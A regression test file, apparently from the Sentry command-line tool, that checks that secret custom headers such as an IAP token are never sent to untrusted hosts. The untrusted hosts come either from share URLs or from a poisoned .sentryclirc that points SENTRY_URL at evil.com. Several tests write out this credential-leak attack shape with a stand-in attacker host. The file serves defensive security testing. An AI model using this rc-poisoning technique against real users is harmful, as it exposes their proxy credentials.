/**
 * CVE regression: custom-headers leak via share URL and via the
 * `auth login` rc-URL bypass.
 *
 * Tests `applyCustomHeaders` trust scoping. Two attack shapes:
 * 1. Share URL: `getSharedIssue(https://evil.com, ...)` — headers must
 *    not attach to URLs that don't match the active token.
 * 2. auth login bypass: when `env.SENTRY_URL` is rc-poisoned and no
 *    token is active yet, headers must fail closed.
 *
 * See also `fetch-layer-guard.test.ts` for the Bearer-token path.
 */

import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { getSharedIssue } from "../../../src/lib/api/issues.js";
import {
  _resetCustomHeadersCache,
  applyCustomHeaders,
} from "../../../src/lib/custom-headers.js";
import {
  captureEnvTokenHost,
  resetEnvTokenHostForTesting,
} from "../../../src/lib/env-token-host.js";
import { useEnvSandbox } from "../../helpers.js";

const ENV_KEYS = [
  "SENTRY_AUTH_TOKEN",
  "SENTRY_TOKEN",
  "SENTRY_HOST",
  "SENTRY_URL",
  "SENTRY_CUSTOM_HEADERS",
] as const;

describe("CVE: custom-headers leak (share URL + auth-login bypass)", () => {
  useEnvSandbox(ENV_KEYS);

  beforeEach(() => {
    resetEnvTokenHostForTesting();
    _resetCustomHeadersCache();
  });

  afterEach(() => {
    resetEnvTokenHostForTesting();
    _resetCustomHeadersCache();
  });

  test("IAP token NEVER leaks to untrusted share URL (direct applyCustomHeaders)", () => {
    process.env.SENTRY_CUSTOM_HEADERS = "X-IAP-Token: secret-iap-value";
    // User's self-hosted instance is legit — they have a token for it.
    process.env.SENTRY_HOST = "https://sentry.acme.com";
    captureEnvTokenHost();

    const headers = new Headers({ "Content-Type": "application/json" });
    // Attacker share URL to evil.com
    applyCustomHeaders(
      headers,
      "https://evil.com/api/0/shared/issues/deadbeef/"
    );
    expect(headers.get("X-IAP-Token")).toBeNull();
  });

  test("no-token + poisoned SENTRY_URL: custom headers fail closed (auth-login bypass)", () => {
    // CRITICAL: the auth-login bypass writes env.SENTRY_URL from rc without
    // trust-checking. If applyCustomHeaders fell back to `getConfiguredSentryUrl()`
    // as a trust anchor, an attacker rc could establish trust simply by having
    // the user `cd` into their repo and run `auth login` (no --url).
    //
    // Scenario: fresh install, no token, attacker's .sentryclirc has written
    // SENTRY_URL = https://evil.com. User has IAP tokens configured for
    // their real proxy via SENTRY_CUSTOM_HEADERS.
    delete process.env.SENTRY_AUTH_TOKEN;
    delete process.env.SENTRY_TOKEN;
    process.env.SENTRY_CUSTOM_HEADERS = "X-IAP-Token: secret-iap-value";
    process.env.SENTRY_URL = "https://evil.com";

    // Even the legit device-flow endpoint on evil.com must NOT get the IAP token
    const headers = new Headers();
    applyCustomHeaders(headers, "https://evil.com/oauth/device/code/");
    expect(headers.get("X-IAP-Token")).toBeNull();
    // And no headers at all
    expect([...headers.keys()]).toHaveLength(0);
  });

  test("getSharedIssue with attacker baseUrl does not leak custom headers (direct-call regression)", async () => {
    // Simulates someone bypassing applySentryUrlContext and calling
    // getSharedIssue directly with an attacker-controlled baseUrl.
    process.env.SENTRY_CUSTOM_HEADERS = "X-IAP-Token: secret";
    process.env.SENTRY_HOST = "https://sentry.acme.com";
    captureEnvTokenHost();

    // Intercept fetch to capture outbound headers
    const originalFetch = globalThis.fetch;
    let capturedHeaders: Headers | undefined;
    globalThis.fetch = (async (
      input: RequestInfo | URL,
      init?: RequestInit
    ) => {
      capturedHeaders = new Headers(
        init?.headers ?? (input instanceof Request ? input.headers : undefined)
      );
      return new Response("{}", { status: 404 });
    }) as typeof fetch;

    try {
      await getSharedIssue("https://evil.com", "deadbeef12345678").catch(() => {
        /* we only care about headers, not the response */
      });
      expect(capturedHeaders?.get("X-IAP-Token")).toBeNull();
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  test("SaaS token + regional silo: custom headers attach (legitimate SaaS multi-region)", () => {
    // Regression for the trust-extension path: SaaS tokens trust any
    // *.sentry.io host via SaaS equivalence.
    // Note: on SaaS, getCustomHeaders() short-circuits (IAP is a self-hosted
    // feature), so even legit custom headers don't attach. This test
    // documents that behavior.
    delete process.env.SENTRY_HOST;
    delete process.env.SENTRY_URL;
    process.env.SENTRY_AUTH_TOKEN = "saas-token";
    process.env.SENTRY_CUSTOM_HEADERS = "X-Custom: value";
    captureEnvTokenHost();

    const headers = new Headers();
    applyCustomHeaders(headers, "https://us.sentry.io/api/0/");
    // SaaS short-circuit in getCustomHeaders → no attachment even for trusted host
    expect(headers.get("X-Custom")).toBeNull();
  });

  test("matching self-hosted request: custom headers attach (legitimate use)", () => {
    process.env.SENTRY_HOST = "https://sentry.acme.com";
    process.env.SENTRY_AUTH_TOKEN = "test-token";
    process.env.SENTRY_CUSTOM_HEADERS = "X-IAP-Token: legit";
    captureEnvTokenHost();

    const headers = new Headers();
    applyCustomHeaders(headers, "https://sentry.acme.com/api/0/organizations/");
    expect(headers.get("X-IAP-Token")).toBe("legit");
  });

  test("IAP onboarding: 'auth login --url' registers a trust anchor so custom headers attach during OAuth device flow", async () => {
    // Scenario: first-time self-hosted login with IAP protection.
    // User runs `sentry auth login --url https://sentry.acme.com` before
    // having any token. The device-code request MUST carry the IAP
    // token or the IAP proxy will block it.
    delete process.env.SENTRY_AUTH_TOKEN;
    delete process.env.SENTRY_TOKEN;
    process.env.SENTRY_CUSTOM_HEADERS = "X-IAP-Token: legit";

    // `applyLoginUrl` (from login command) registers the trust anchor
    const { applyLoginUrl } = await import(
      "../../../src/commands/auth/login.js"
    );
    applyLoginUrl("https://sentry.acme.com");

    const headers = new Headers();
    applyCustomHeaders(headers, "https://sentry.acme.com/oauth/device/code/");
    // Legitimate IAP token attaches — this is the onboarding case
    expect(headers.get("X-IAP-Token")).toBe("legit");

    // Cleanup the anchor so subsequent tests aren't affected
    const { resetLoginTrustAnchorForTesting } = await import(
      "../../../src/lib/token-host.js"
    );
    resetLoginTrustAnchorForTesting();
  });

  test("Attacker .sentryclirc does NOT register a login trust anchor (rc bypass still fails closed)", async () => {
    // This is the critical distinguishing test: the .sentryclirc shim
    // writes env.SENTRY_URL via the skipUrlTrustCheck bypass, but it
    // does NOT call registerLoginTrustAnchor. So no-token
    // applyCustomHeaders must still fail closed even though SENTRY_URL
    // is set.
    delete process.env.SENTRY_AUTH_TOKEN;
    delete process.env.SENTRY_TOKEN;
    process.env.SENTRY_CUSTOM_HEADERS = "X-IAP-Token: secret";
    process.env.SENTRY_URL = "https://evil.com"; // simulating rc shim write
    // Intentionally NOT calling applyLoginUrl — attacker flow doesn't

    const { resetLoginTrustAnchorForTesting } = await import(
      "../../../src/lib/token-host.js"
    );
    resetLoginTrustAnchorForTesting();

    const headers = new Headers();
    applyCustomHeaders(headers, "https://evil.com/oauth/device/code/");
    expect(headers.get("X-IAP-Token")).toBeNull();
  });
});
